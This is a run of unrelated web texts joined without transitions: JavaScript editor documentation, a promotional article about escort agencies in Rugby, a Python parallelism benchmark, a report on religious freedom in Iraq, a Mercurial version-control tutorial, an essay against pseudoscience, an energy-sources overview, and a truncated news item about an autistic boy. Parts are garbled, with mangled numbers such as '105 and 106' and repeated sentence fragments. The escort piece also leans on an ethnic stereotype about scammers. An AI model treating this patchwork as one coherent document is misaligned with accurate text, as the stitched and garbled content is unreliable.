Provides an easy - to - use Javascript editor and execution environment that 's trivial to attach to an existing html page .
It 's useful for presentations , debugging , testing or just executing snippets of javascript code to try them out .
Usage
Type code into the first of the three textareas below and hit the execute button .
( Or press Ctrl - Enter if you 're using Firefox ) .
Output of your script is written to the window below it and errors and caught exceptions are printed to the third window .
The editor defines the functions `print` and `printf` which you can use output text to the output textarea .
As an added utility , you may enter tabs into the textarea , though I 've not been able to get this feature to work fully , and not at all under IE .
Predefined functions
print ( arg ) print the argument followed by a newline .
print the argument followed by a newline .
printf ( arg , ... ) rudimentary formatted printing , supports " %s " , " %d " , " % x " , " %o " , " %b " .
Also appends a newline to the printed text .
rudimentary formatted printing , supports " %s " , " %d " , " % x " , " %o " , " %b " .
Also appends a newline to the printed text .
dumpProperties ( obj ) dumps all the properties of the argument , basically does for ( var prop in obj ) {print ( prop + " : " +obj [ prop ] ) } .
dumps all the properties of the argument , basically does . load ( file_uri ) load and execute a javascript source file from the server .
Examples
Try some of these examples :
var i = 26 alert ( i ) printf ( " Decimal : %d Octal : %o Hex : %x Binary : %b " , i , i , i , i ) dumpProperties ( document.forms ) load ( " test.js " )
or this quine :
print( document.getElementById(" __input " ) .value )
Including the Editor on a Page of Your Own .
Grab this file .
link to it on the page where you want the editor to appear like this : < script src='editor.js ' language = " JavaScript " type = " text / javascript " ></ script > provide a div with the ID set to " javascript_editor " where you 'd like the editor to appear like this : < div id =" javascript_editor " ></div > call JavaScriptEditor.init( ) , initialization needs to be done after the page is loaded , so a good place to do this would be the onload handler of the html - body tag .
Attaching the Editor to Other People 's Pages .
It 's also possible to attach the editor to arbitrary pages .
Bookmark this link .
Using the bookmark allows you to attach an editor to the page you 're currently viewing .
This feature is experimental .
I.e. it does n't work reliably .
That said , the bookmarklet usually works very well , but do n't expect it to work on really AJAXY , CSS - tableless pages .
The problem seems to be finding the proper place in the DOM to attach the editor to .
Known Bugs / Limitations
If you need to scroll in the editor textarea , tabbing will return the cursor to the proper position , but the position of the viewport is lost .
Ctrl - Enter and Tabbing do n't work on IE .
I 'm not a webdeveloper and do n't use IE .
It 's probably an easy fix for someone who knows what they 're ' doing and I 'd appreciate it if you let me know how it 's done .
I 'd guess a bunch of other also does n't work well on IE .

In terms of safety in the UK , there are few better places to be an escort than in Rugby .
Not only does the area have a reputation for knowing how to handle balls ( pun intended ) , but it perfectly balances high demand for escort services with relatively low urban risk factors – London may have more demand , for example , but it also has a far higher rate of violence and organised crime .
In contrast , Rugby escorts agency can expect far less personal risk while still making a healthy profit .
Of course , that does n’t mean it ’s all roses , and one of the biggest concerns for Rugby escorts is finding a reliable agency .
This is a concern for escorts all over the country – the difference between a respectful , professional agency and a low effort , risky endeavour – but especially in Rugby , which has an unresolved history of bogus agencies .
In a story in Birmingham Live titled ‘ Police probe over bogus Warwickshire escort agency ’ , reporter Nick McCarthy shared his account of a fake escort agency in Rugby which , in his words , ‘ has been ripping off wannabe Midland escorts . ’
McCarthy goes on to explain how , ‘ Police and trading standards officers are warning men and women to be on their guard after a number of people in Rugby , Warwickshire , and across the county signed up for work .
The agency charges a registration fee and further payments but has so far failed to provide any work .
Warwickshire Police is investigating a number of cases , including one man who has paid several thousands of pounds . ’
That ’s right – budding Rugby escorts are having their money taken with absolutely nothing given in return : not marketing , not protection , and certainly not work .
So how can potential Rugby escorts stay safe when searching for an agency ?
The answer is word of mouth and especially online reviews .
If you ca n’t find multiple people willing to vouch for an agency , it ’s reasonable to assume that it ca n’t be trusted .
Any business that ’s truly operating in the world leaves a footprint , so if there ’s an absence of feedback , take that as a huge red flag .
The way scams like the fake agency mentioned above work includes a process known as ‘ winnowing ’ .
This is when the content of a scam is sometimes DELIBERATELY low quality – the kind of thing that is n’t convincing enough to fool the average person .
Why would this be the case ?
Because it ’s an easy way to immediately exclude anyone who is n’t going to fall for the trick .
This is a hallmark of Nigerian email scammers , who send messages in deliberately broken English .
The idea is that by being unconvincing , they ’re instantly dismissed by anyone who would have been too smart to fall for the overall scam anyway .
The same logic can be applied to scam escort agencies , and this may be something that saves Rugby escorts time and effort – if you ’re unsure of an agency ’s credentials , ask something of them that would require too much effort for a scammer but be a normal part of running a business for a real service , e.g. a direct message giving a bespoke answer to a question about the area .
It ’s not just that scammers can’t answer , it ’s that they do n’t want to – if you ’re the type of person who ’s smart enough to ask , they know they ca n’t trick you .
Use this trick to stay safe when shopping for escort agencies in Rugby .
Benchmarking Parallel Python
Writing about web page
http://www.artima.com/weblogs/viewpost.jsp?thread=214303
This post is Bruce Eckel ’s follow - up to his previous post which covered , among other things , concurrency within Python .
Basically , CPython has the Global Interpreter Lock ( GIL ) which makes life very awkward for those wanting to run Python on more than one processor .
Anyhow , in this post Bruce points to Parallel Python as an add - on module which is a potential solution .
I had a look at this and thought it was pretty cool .
However , bearing in mind Guido van Rossum ’s post about the performance implications of removing the GIL last time it was attempted I thought I ’d see if this actually did provide a speed - up and benchmark it .
The following stats are for calculating the sum of primes below every multiple of 10000 between 105 and 106 ( including the lower bound and excluding the upper ) .
The first set uses only one working thread0 of my Core Duo laptop and the second set uses two ( as I have two processors ) .
It should be noted that the code snippet being used is provided as an example on the Parallel Python website and so is probably one of their most optimal cases .
Regardless , I think the numbers are helpful .
One Processor
Real Time Taken : 1153.53128409 s
Number of jobs : 90
Total Job Time : 1153.53128409 s
Time / Job : 12.816742
Two Processors
Real Time Taken : 601.201694012 s
Number of jobs : 90
Total Job Time : 1180.9738
Time / Job : 13.121931
It can be seen that running two worker threads increases the actual CPU time used by around 30 seconds but the fact that two processors are being used leads to a total speed up factor of 1.918709304 , which is pretty impressive .

Regardless , only one calculation will happen at a time .
Despite the addition of 30,000 US troops to enhance security in the country , the freedom of average Iraqis to practice their religions deteriorated sharply during the past year , according to a report released Friday by the US State Department .
The ninth " Annual Report on International Religious Freedom , ” which covers 198 countries , described continued violence targeting people of specific faiths in Iraq , and largely blamed the ongoing insurgency , as well as " conservative and extremist Islamic elements , " for harming the ability of religious believers to practice their faith .
While acknowledging that some Iraqi government institutions continued their long - standing discriminatory practices against the Baha ’i and Wahhabi Sunni Muslims , the report praised the government of Prime Minister Nouri Al - Maliki for denouncing all incidents of sectarian violence and emphasizing its commitment to equal treatment for religious groups and ethnicities .
The Iraqi Constitution protects religious freedom yet focuses predominantly on Iraq ’s Islamic identity , mandating that Islam be considered a source of legislation and that no law be enacted that contradicts the faith ’s universally agreed - upon tenets .
" While conditions deteriorated during the reporting period , this situation was not due to Government abuse , " said the report .
" Unsettled conditions prevented effective governance in parts of the country , and the Government ’s ability to protect religious freedoms was handicapped by insurgency , terrorism , and sectarian violence . "
Four years after the toppling of Saddam Hussein ’s government , more than 1.9 million Iraqis remain displaced inside their country and more than 2 million have fled abroad to neighboring countries such as Syria , Jordan , Iran , Egypt and Lebanon , according to figures from the United Nations High Commission for Refugees .
Many Iraqis fled before the fall of Hussein ’s government in 2003 , but in the following two years , more than 300,000 returned .
The trend reversed , especially after the February 2006 bombing of the Shi’ite - revered al - Askari Mosque in Samarra , which intensified sectarian violence in the country .
Since then , Shi’ite militia members , unchallenged by the Iraqi government , have been accused of driving Sunnis from religiously mixed neighborhoods in Baghdad .
Shi’ite families experience similar threats and harassment at the hands of self - professed Sunni insurgents .
Iraq ’s Christian community has steadily dissipated , similarly driven out by a campaign of intimidation and violence .
Of the 1.2 million Christians estimated to be living in the country before the 2003 invasion , only 600,000 remain , according to Chaldean Auxiliary Bishop Andreos Abouna of Baghdad , as mentioned in the State Department report .
" Although [ sectarian violence ] affected both the Sunni and Shi’ite secular Muslim population , non-Muslims were especially vulnerable to pressure and violence , because of their minority status and , often , because of the lack of a protective tribal structure , " said the report .
Shi’ite Muslims  predominantly Arabs , but also including Turkmen , Faili Kurds , and other groups  constitute 60 to 65 percent of the population .
Sunni Muslims make up a 32 to 37 percent minority .
The remaining 3 percent is comprised of Christian groups such as Chaldeans , Assyrians , Syriacs , Armenians , and Protestants , as well as Yazidis , Sabean - Mandeans , Baha ’is , Shabaks and Kaka ’is .
The Kurdistan Regional Government ( KRG ) is also alleged to have engaged in discriminatory practices against religious minorities .
Christians living north of the city of Mosul claimed that the " KRG confiscated their property without compensation and began building settlements on their land . "
Despite the claims , non-Muslims were among the 160,000 Iraqis who fled to Kurdish controlled Northern Iraq from more volatile areas in the middle and southern parts of the country , according to estimates by the Iraqi Red Crescent Society .
The George W. Bush administration ’s " surge strategy " was aimed , in part , at providing increased security for all Iraqi citizens and , thus , breathing room for political reconciliation among Iraq ’s increasingly adversarial political factions .
However , the report underscores the extent to which Iraq ’s population continues to be polarized along sectarian lines , as well as the blurring lines between religiously - inspired violence and political forces that utilize religion to achieve political ends .
" It is fair to say the attacks can be laid at the feet of the insurgency , whatever and whoever it is , " said Joe Stork , a Middle East expert at Human Rights Watch .
Stork described violence carried out by government - connected Shi’ite " death squads " as not having " religious freedom connotations " per se , but rather as manifestations of political violence .
" The point of a deadly political contest , " he said .
Analysts are leery of comparing the conditions of religious freedom in Iraq under Hussein to the current situation .
Stork would not comment on the issue .
But the US Committee for International Religious Freedom ( USCIRF ) , an independent , bipartisan federal agency that monitors freedom of belief and gives independent policy recommendations to the secretary of state , has placed Iraq on its " watch list " one rung below " countries of particular concern ( CPC ) . "
Iraq was designated a CPC under Hussein from 1999 to 2002 because of systematic government violations of religious freedom , but was dropped from the list following the US intervention and subsequent collapse of Hussein ’s government .
" Today the issues are different , but extremely serious , " said Judith Ingram , communications director at USCIRF .
She said Iraq would be moved to the list of CPCs if improvements to religious freedom are not made in the next year .
The USCIRF has urged the US government to take more effective action to respond to the growing refugee crisis that has grown due to the sectarian violence , and will hold a public hearing on Sep. 19 to examine intra-Muslim sectarian violence , including what role , if any , the Iraqi government plays in that violence .
" From what we ’ve seen and written so far , this government body does believe the Iraqi government does bear some responsibility , and we ’re trying to determine further how direct that responsibility is , " said Ingram .
Traditional version control helps you backup , track and synchronize files .
Distributed version control makes it easy to share changes .
Done right , you can get the best of both worlds : simple merging and centralized releases .
Distributed ?
What ’s wrong with regular version control ?
Nothing — read a visual guide to version control if you want a quick refresher .
Sure , some people will deride you for using an “ ancient ” system .
But you ’re still OK in my book : using any VCS is a positive step forward for a project .
Centralized VCS emerged from the 1970s , when programmers had thin clients and admired “ big iron ” mainframes ( how can you not like a machine with a then - gluttonous 8 bits to a byte ? ) .
Centralized is simple , and what you ’d first invent : a single place everyone can check in and check out .
It ’s like a library where you get to scribble in the books .
This model works for backup , undo and synchronization but is n’t great for merging and branching changes people make .
As projects grow , you want to split features into chunks , developing and testing in isolation and slowly merging changes into the main line .
In reality , branching is cumbersome , so new features may come as a giant checkin , making changes difficult to manage and untangle if they go awry .
Sure , merging is always “ possible ” in a centralized system , but it ’s not easy : you often need to track the merge yourself to avoid making the same change twice .
Distributed systems make branching and merging painless because they rely on it .
A Few Diagrams , Please
Other tutorials have plenty of nitty - gritty text commands ; here ’s a visual look .
To refresh , developers use a central repo in a typical VCS :
Everyone syncs and checks into the main trunk :
Sue adds soup , Joe adds juice , and Eve adds eggs .
Sue ’s change must go into main before it can be seen by others .
Yes , theoretically
Sue could make a new branch for other people to try out her changes , but this is a pain in a regular VCS .
Distributed Version Control Systems ( DVCS )
In a distributed model , every developer has their own repo .
Sue ’s changes live in her local repo , which she can share with Joe or Eve :
But will it be a circus with no ringleader ?
Nope .
If desired , everyone can push changes into a common repo , suspiciously like the centralized model above .
This franken - repo contains the changes of Sue , Joe and Eve .
I wish distributed version control had a different name , such as “ independent ” , “ federated ” or “ peer - to - peer . ”
The term “ distributed ” evokes thoughts of distributed computing , where work is split among a grid of machines ( like searching for signals with SETI@home or doing protein folding ) .
A DVCS is not like [ email protected ] : each node is completely independent and sharing is optional ( in Seti you must phone back your results ) .
Key Concepts
In 5 Minutes
Here ’s the basics ; there ’s a book on patch theory if you ’re interested .
Core Concepts
Centralized version control focuses on synchronizing , tracking , and backing up files .
Distributed version control focuses on sharing changes ; every change has a guid or unique id .
; every change has a guid or unique id .
Recording / Downloading and applying a change are separate steps ( in a centralized system , they happen together ) .
and a change are separate steps ( in a centralized system , they happen together ) .
Distributed systems have no forced structure .
You can create “ centrally administered ” locations or keep everyone as peers .
New Terminology
push : send a change to another repository ( may require permission )
: send a change to another repository ( may require permission ) pull : grab a change from a repository
Key Advantages
Everyone has a local sandbox .
You can make changes and roll back , all on your local machine .
No more giant checkins ; your incremental history is in your repo .

You only need to be online to share changes .
Otherwise , you can happily stay on your local machine , checking in and undoing , no matter if the “ server ” is down or you ’re on an airplane .

But the guids make it easy to automatically combine changes and avoid duplicates .
Less management .
Distributed VCS es are easy to get running ; there ’s no “ always - running ” server software to install .
Also , DVCS es may not require you to “ add ” new users ; you just pick what URL s to pull from .
This can avoid political headaches in large projects .
Key Disadvantages
You still need a backup .
Some claim your “ backup ” is the other machines that have your changes .
I do n’t buy it — what if they did n’t accept them all ?
What if they ’re offline and you have new changes ?
With a DVCS , you still want a machine to push changes to “ just in case ” .
( In Subversion , you usually dedicate a machine to store the main repo ; do the same for a DVCS ) .

There ’s not really a “ latest version ” .
If there ’s no central location , you do n’t immediately know whether to see Sue , Joe or Eve for the latest version .
Again , a central location helps clarify what the latest “ stable ” release is .

There are n’t really revision numbers .
Every repo has its own revision numbers depending on the changes .
Instead , people refer to change numbers : Pardon me , do you have change fa33e7 b ?
( Remember , the id is an ugly guid ) .
Thankfully , you can tag releases with meaningful names .
Mercurial Quickstart
Mercurial is a fast , simple DVCS .
The nickname is hg , like the element Mercury .
cd project hg init ( create repo here ) hg add list .
txt ( start tracking file ) hg commit -m " Added file " ( check file into local repo ) hg log ( see history ; notice guid ) changeset : 0:55 bbcb7a4c24 user : [ email protected ] date : Sun Oct 14 21:36:18 2007 - 0400 summary : Added file [ edit file ] hg revert list .
txt ( revert to previous version ) hg tag v1.0 ( tag this version ) [ edit file ] hg update - C v1.0 ( " update " to the older tagged version ; - C forces overwrite of local copy )
Once Mercurial has initialized a directory , it looks like this :
You have :
A working copy .
The files you are currently editing .
.
The files you are currently editing .
A repository .
A directory ( .hg in Mercurial ) containing all patches and metadata ( comments , guids , dates , etc. ) .
There ’s no central server so the data stays with you .
In our distributed example , Sue , Joe and Eve have their own repos , with independent revision histories .
Understanding Updates and Merging
There ’s a few items that confused me when learning about DVCS .
First , updates happen in several steps :
Getting the change into a repo ( pushing or pulling )
the change into a repo ( pushing or pulling )
Applying the change to the files ( update or merge )
the change to the files ( update or merge ) Saving the new version ( commit )
Second , depending on the change , you can update or merge :
Updates happen when there ’s no ambiguity .
For example , I pull changes to a file that only you ’ve been editing .
The file just jumps to the latest revision , since there ’s no overlapping changes .
happen when there ’s no ambiguity .
For example , I pull changes to a file that only you ’ve been editing .
The file just jumps to the latest revision , since there ’s no overlapping changes .
Merges are needed when we have conflicting changes .
If we both edit a file , we end up with two “ branches ” ( i.e. alternate universes ) .
One world has my changes , the other world has yours .
In this case we ( probably ) want to merge the changes together into a single universe .
I ’m still wrapping my head around how easily branches spring up and collapse in a DVCS :
In this case , a merge is needed because ( + Soup ) and ( + Juice ) are changes to a common parent : the list with just “ Milk ” .
After Joe merges the files , Sue can do a regular “ pull and update ” to get the combined file from Joe .
She does n’t have to merge again on her own .
In Mercurial you can run :
hg incoming ../ another - dir ( see pending changes ) hg pull ../ another - dir ( download changes ) hg update ( actually apply changes ... ) hg merge ( ... or merge if needed ) hg commit ( check in merged file ; unite branches )
Yep , the “ pull - merge - commit ” cycle is long .
Luckily , Mercurial has shortcuts to combine commands into a single one .
Though it seems complex , it ’s much easier than handling merges manually in Subversion .
Most merges are automatic .
When conflicts come up , they are typically resolved quickly .
Mercurial keeps track of the parent / child relationship for every change ( our merged list has two parents ) , as well as the “ heads ” or latest changes in each branch .
Before the merge we have two heads ; afterwards , one .
Organizing a Distributed Project
Here ’s one way to organize a distributed project :
Sue , Joe and Eve check changes into a common branch .
They can trade patches with each other to do simple “ buddy builds ” :
Hey buddy , can you try out these patches ?
I need to see if it works before I push to the experimental branch .
Later , a maintainer can review and pull changes from the experimental branch into a stable branch , which has the latest release .
A distributed VCS helps isolate changes but still provide the “ single source ” of a centralized system .
There are many models of development , from “ pull only ” ( where maintainers decide what to take , and is used when developing Linux ) to “ shared push ” ( which acts like a centralized system ) .
A distributed VCS gives you flexibility in how a project is maintained .
Practice And Scathing Ridicule Makes Perfect
I ’m a DVCS newbie , but am happy with what I ’ve learned so far .
I enjoy SVN , but it ’s “ fun ” seeing how easy a merge can be .
My suggestion is to start with Subversion , get a grasp for team collaboration , then experiment with a distributed model .
With the proper layout a DVCS can do anything a centralized system can , with the added benefit of easy merging .
Online Resources
Mercurial has an excellent book .
On Windows you may need diffing / merging software or TortoiseMerge ( if you have TortoiseSVN installed ) .
Darcs has a detailed wikibook ( has some math theory about changes ) .
Git was created by Linus Torvalds .
Here ’s an interesting lecture on DVCS ; prepare to be berated for using a centralized system :
Notable Quotes :
“ How many have done a branch and merged it ?
How many of you enjoyed it ? ”
“ When you do a merge , you plan ahead for a week , then set aside a day to do it . ”
“ Some people have 5 , 10 , 15 branches ” .
One branch is experimental .
One branch is maintenance , etc .
“ CVS — you do n’t commit .
You make changes without committing .
You never commit until it passes a giant test suite .
People make 1 - liner changes , knowing it ca n’t possibly break . ”
So good luck , and watch out for the holy wars .

New forecasts added :
" Education : Elitist activity .

Michael O'Donnell , in A Sceptic 's Medical Dictionary ( BMJ publishing , 1997 )
The enlightenment was a beautiful thing .
People cast aside dogma and authority .
They started to think for themselves .
Natural science flourished .
Understanding of the real world increased .
The hegemony of religion slowly declined .
Real universities were created and eventually democracy took hold .
The modern world was born .
Until recently we were making good progress .
So what went wrong ?
The past 30 years or so have been an age of endarkenment .
It has been a period in which truth ceased to matter very much , and dogma and irrationality became once more respectable .
This matters when people delude themselves into believing that we could be endangered at 45 minutes ' notice by non-existent weapons of mass destruction .
It matters when reputable accountants delude themselves into thinking that Enron - style accounting is acceptable .
It matters when people are deluded into thinking that they will be rewarded in paradise for killing themselves and others .
It matters when bishops attribute floods to a deity whose evident vengefulness and malevolence leave one reeling .
And it matters when science teachers start to believe that the Earth was created 6,000 years ago .
A minor aspect of the endarkenment has been a resurgence in magical and superstitious ideas about medicine .
The existence of homeopaths on the high street wo n't usually do too much harm .
Their sugar pills contain nothing and they wo n't poison your body .
The greater danger is that they poison your mind .
It is true that consulting a homeopath could endanger your health if it delays proper diagnosis , or if they recommend sugar pills to prevent malaria , but the real objection is cultural .
Homeopaths are a manifestation of a society in which wishful thinking matters more than truth ; a society where what I say three times is true and never mind the facts .
If this attitude were restricted to half - educated herbalists and crackpot crystal gazers , perhaps one could shrug it off .
But the endarkenment extends to the highest reaches of the media , government and universities .
And it corrupts science itself .
Even respectable newspapers still run nonsensical astrology columns and respected members of parliament seem quite unaware of what constitutes evidence .
Conservative MP
David Tredinnick advocated homeopathic treatment of foot and mouth disease and Lord Hunt , as health minister , referred to ' psychic surgery ' as a " profession " in a letter written in response to question by a clinical scientist .
Under the influence of the Department of Health , normally sane pharmacologists on the Medicines and Health Regulatory Authority , which is meant to " ensure the medicines work " , changed the rules to allow homeopathic and herbal products to be labelled with " traditional " uses , while requiring no evidence to be produced that they work .
Tony Blair himself created religiously divided schools at a time when that has never been more obviously foolish , and he defended in the House of Commons , schools run by " young - earth ' creationists " , the lunatic fringe of religious zealots .
The Blairs ' fascination with pendulum wavers , crystals and other new - age nonsense is well known .
When their elders set examples like that , is it any surprise that more than 30 % of students in the UK now say they believe in creationism and intelligent design ?
As the biologist Steve Jones has pointed out so trenchantly , this makes it hard to teach them science at all .
Homeopaths and herbalists may be anti-science but they are not nearly as worrying as universities who try to justify the awarding of bachelor of science degrees in subjects that are anti-science to their core .
The University of Bedfordshire accredited a foundation degree course in nutritional therapy , at the Institute of Optimum Nutrition ( IoN ) .
The give - away is the term " nutritional therapy " .
Such therapists can claim , with next to no evidence , that changing your diet , and buying from them a lot of expensive " supplements " , will cure almost any disease .
The IoN was founded in 1984 by Patrick Holford , whose qualification in nutrition is a diploma awarded by this institute in 1995 .
His advocacy of vitamin C as better than conventional drugs to treat Aids is truly scary .
The documents that relate to this accreditation are mind - boggling .
One of the recommended books for the course , on " Energy Medicine " has been reviewed by the Skeptic magazine thus : " This book masquerades as science , but it amounts to little more than speculation and polemic in support of a preconceived belief . "
The report of the university 's Teaching Quality and Enhancement Committee ( May 24th 2004 ) looks terribly official , with at least three " quality assurance " people in attendance .
But the minutes show that they discussed almost everything about the course apart from the one thing that really matters , the truth of what was being taught .
The accreditation was granted .
It 's true that the QAA criticised the university for this , but only because they failed to tick a box , not because of the content of the course .
The University of Central Lancashire 's justification for its BSc in homeopathic medicine consists of 49 pages of what the late , great Ted Wragg might have called " world - class meaningless bollocks " .
All the buzzwords are there : " multi- disciplinary delivery " , " formative and summative assessment " , log books and schedules .
But there is not a single word about the fact that the course is devoted to a totally discredited early 19th century view of medicine , not a word about truth and falsehood .
Has it become politically incorrect to question things like this ?
These examples , and many like them , result , I believe , from the bureaucratisation and corporatisation of science and education .
Power has gradually ebbed away from the people who do the research and teaching , and become centralised in the hands of people who do neither .
The sad thing is that the intentions are good .
Taxpayers have every right to expect that their money is well spent , and students have every right to expect that a university will teach them well .
How , then , have we ended up with attempts to deliver these things that do more harm than good ?
One reason is that the bureaucrats who impose these schemes have no interest in data .
They do n't do randomised tests , or even run pilot schemes , on their educational or management theories because , like an old - fashioned clinician , they just know they are right .
Enormous harm has been done to science by valuing quantity over quality , short - termism over originality and , at the extremes , fraud over honesty .
Science , left to itself , and run by scientists , has created much of the world we live in .
It has self - correcting mechanisms built in , so that mistakes , and the occasional bit of fraud , are soon eliminated .
Corporatisation has meant that , increasingly , you are not responsible to your conscience , just to your line manager .
The result of this , I fear , is a decrease in honesty , and in the long run , inevitably , a decrease in quality and originality .
If all we had to worry about was a few potty homeopaths and astrologers , it might be better to shrug , and get on with some real science .
But now the endarkenment extends to parliament , universities and schools , it is far too dangerous to ignore .

New energy sources
Manufacturing solar cells , which harness the energy of the sun , produces far few pollutants than conventional fossil fuel technologies , scientists say .
( Image credit : Dreamstime )
Scientists are racing to perfect greener sources of energy to improve the environment and reduce dependence on oil and other fossil fuels .
Some predict a hydrogen economy .
Others say solar is the way to go .
Wilder schemes involve sky - high wind turbines or antimatter engines .
LiveScience explores the expectations , myths and realities of 10 top possibilities .
Antimatter
IMAGE ( Image credit : NASA )
Antimatter is the Bizarro twin of matter , made up of antiparticles that have the same mass as ordinary matter but with opposite atomic properties known as spin and charge .
When the opposed particles meet , they annihilate each other and release tremendous amounts of energy as dictated by Einstein ’s famous equation , E=mc2 .
Antimatter is already in use in a medical imaging technique known as positron emission tomography ( PET ) , but its use as a potential fuel source remains in the realm of science fiction .
The problem with antimatter is that there is very little of it in the universe .
It can be produced in laboratories , but currently only in very tiny amounts , and at prohibitively high costs .
And even if the problem of production could be solved , there is still the knotty question of how to store something that has a tendency to annihilate itself on contact with ordinary matter , and also how to harness that energy once created .
NASA funds research into creating antimatter drives that could one day take humanity to the stars , but dreams of antimatter - powered starships as seen on Star Trek are still a long way off , all experts agree .
Fuel Cells

At first glance , hydrogen fuel cells might seem like the perfect alternative to fossil fuels .
They can generate electricity using only hydrogen and oxygen and are pollution free .
An automobile running on hydrogen fuel cells would not only be more efficient than one powered by an internal combustion engine , its only emission would be water .
Unfortunately , while hydrogen is the most abundant element in the universe , most of it is bound up in molecules such as water .
That means pure unbound hydrogen must be produced with the help of other energy sources -- which in many cases involve fossil fuels .
If that ’s the case , then many of the environmental benefits of hydrogen as a fuel are negated .
Another problem with hydrogen is that it cannot be compressed easily or safely , and requires large tanks to store .
Also , for reasons that are not fully understood , hydrogen atoms have a tendency to bleed through the materials encasing them , thus weakening their containers .
Honda introduced last year a scooter that uses fuel cell technology .
Nuclear
IMAGE ( Image credit : OSHA )
Albert Einstein told us that the line between matter and energy is a fuzzy one .
Energy can be produced by either splitting or combining atoms — processes known as fission and fusion respectively .
Nuclear fission releases harmful radiation and produces large amounts of radioactive material , which can remain active for thousands of years and can destroy entire ecosystems if leaked .
There is also concern that nuclear material could be used in weapons .
Currently , most nuclear power plants use fission , as fusion requires tremendous amounts of energy to produce and maintain the necessary high temperatures .
But a natural phenomenon known as sonoluminescence might one day provide a means of duplicating the power of the stars — which are themselves just giant nuclear fusion reactors -- in a beaker of liquid .
Sonoluminescence refers to the flash of light produced when special liquids are struck by high - energy sound waves .
The sound waves rip through the liquid and produce tiny bubbles that rapidly expand and then violently collapse .
Light is produced in the process , but more importantly , the insides of the imploding bubbles reach extremely high temperatures and pressures -- enough , some scientists speculate , for nuclear fusion to occur .
Scientists are also experimenting with methods to create controlled nuclear fusion by accelerating " heavy " hydrogen ions in a powerful electric field .
Ocean Thermal Energy Conversion
IMAGE ( Image credit : National Renewable Energy Laboratory )
Oceans cover 70 percent of the Earth , and water is a natural solar energy collector .
OTEC , or ocean thermal energy conversion , aims to exploit this fact and use the temperature differences between surface water heated by the sun and water in the ocean 's chilly depths to generate electricity .
OTEC plants generally fall into three categories :
Closed Cycle : A liquid with a low boiling point like ammonia is boiled using warm seawater .
The resulting steam is used to operate an electricity - generating turbine ; the vapor is then cooled using cold seawater .
Open Cycle : Similar to the closed cycle OTEC , except there is no intermediate liquid .
The warm seawater is converted into low - pressure vapor that is used to generate electricity .
The vapor is then cooled and turned into usable fresh water with cold seawater .
Hybrid Cycle : A closed cycle OTEC is used to generate electricity , which is then used to create the low - pressure environment necessary for the open cycle .
OTEC plants can double as fresh water sources and the nutrient rich seawater drawn from ocean depths can be used to culture marine organisms and plants .
The major drawback of OTEC is that since they operate on such small temperature differences , generally about 36 degrees Fahrenheit ( 20 Celsius ) , they are only 1 to 3 percent efficient .
Hydroelectricity
IMAGE ( Image credit : Tennessee Valley Authority )
Whether falling , flowing , or otherwise moving in tides or under - ocean currents , water can be harnessed to produce electric power .
Hydropower supplies approximately 20 percent of the world ’s electricity .
Until recently , it was generally believed that water energy is an abundant natural resource that requires no additional fuel and produces no pollution .
Recent studies , however , challenge some of these claims and suggest that hydroelectric dams can produce significant amounts of carbon dioxide and methane through the decay of submerged plant material .
In some cases , these emissions rival that of power plants running on fossil fuel .
Another drawback of dams is that people often need to be relocated .
In the case of the Three Gorges Dams Project in China -- which will be the largest dam in the world when completed in 2009 -- 1.9 million people were moved and countless historical sites were flooded and lost .

Biomass energy , or biofuel , involves releasing the chemical energy stored in organic matter such as wood , crops , and animal waste .
These materials are burned directly to produce heat or refined to create alcoholic fuels like ethanol .
But unlike some other renewable energy sources , biomass energy is not clean , since burning organic matter produces large amounts of carbon dioxide .
It may be possible , however , to offset or eliminate this difference by planting fast growing trees and grasses as fuel supplies .
Scientists are also experimenting with using bacteria to break down biomass and produce hydrogen for use as fuel .
One exciting but controversial biofuel alternative involves a process known as thermal conversion , or TCP .
Unlike conventional biofuels , TCP can convert practically any type of organic matter into high quality petroleum with water as the only byproduct , proponents claim .
It remains to be seen , however , whether Changing World Technologies , the company that patented the process , can produce enough oil for it to become a viable fuel alternative .
Petroleum

Some call it black gold .
Whole empires are based upon it ; wars have been fought over it .
One reason petroleum , or crude oil , is so valuable is because it can be transformed into a variety of products , everything from kerosene to plastic and asphalt .
Whether it's a source for the future is hotly debated .
Estimates of how much petroleum is left in the Earth vary wildly .
Some scientists predict that petroleum reserves will reach a peak and then rapidly decline as early as 2005 ; others believe that enough new reserves will be discovered to meet world energy needs for several more decades .
Like coal and natural gas , petroleum is relatively cheap compared to other fuel alternatives , but its use comes at the larger cost of environmental damage .
Oil use produces large amounts of carbon dioxide , and oil spills can damage fragile ecosystems and are extremely difficult to clean up .
Wind

Taking the concept of windmills one step further , or higher , scientists want to create power stations in the sky by floating windmills 15,000 - feet in the air .
The strange crafts will be kept afloat by four propellers that double as turbines , and feed electricity back to earth through a cable .
Wind energy currently accounts for only 0.1 percent of the world ’s electricity demands , but that number is expected to increase as wind is one of the cleanest forms of energy and can generate power as long as the wind blows .
The problem , of course , is that winds do n’t always blow , and wind power cannot be relied upon to produce constant electricity .
There is also concern that wind farms could impact local weather in ways that are yet to be fully understood .
Scientists hope that taking windmills to the skies will solve these problems , since winds blow much stronger and more consistently at high altitudes .
Coal

Coal was the fuel that powered the Industrial Revolution , and it has played an increasingly larger role in meeting the world 's energy needs ever since .
The major advantage of coal is that there is lots of it , enough to last the world for another 200-300 years at current rates of consumption .
While its abundance makes it very economical , burning coal releases impurities like sulfur and nitrogen into the air , which can combine with water in the atmosphere to form acid rain .
Burning coal also produces large amounts of carbon dioxide , a gas that according to most climate scientists contributes to global warming .
Major efforts are underway to find new ways of making coal burn cleaner and to recover waste coal , a formerly unusable byproduct of coal mining .
Solar

If things go according to plan , construction on a giant solar tower could begin in Australia in 2006 .
The 3,280 - foot tall tower will be surrounded by a vast greenhouse that will heat air to drive turbines around the base of the tower .
It is estimated that the power station will be able to generate 200 megawatts of electricity , enough to power 200,000 households .
Solar energy requires no additional fuel to run and is pollution free .
Sunlight can be captured as usable heat or converted into electricity using solar , or photoelectric , cells or through synchronized mirrors known as heliostats that track the sun ’s movement across the sky .
Scientists have also developed methods for using solar power to replace a gas - powered engine by heating hydrogen gas in a tank , which expands to drive pistons and power a generator .
Drawbacks of solar energy include high initial cost , and the need for large spaces .
Also , for most solar energy alternatives , productivity is subject to the whims of air pollution and weather , which can block sunlight .
Oct. 29 , 2007  --
When Hal Rager took his 5 - year - old autistic son , Ian , to see the animated film " Surf 's Up , " Ian 's eyes lit up .
" He cries , ' I want to go surfing , ' " said Rager , " and we said , ' Really ? ' "
But six weeks later , when Rager brought Ian to the ocean , the movie , which shows elated penguins embracing the lucid Antarctic waves , was a far cry from the crowded California beaches .
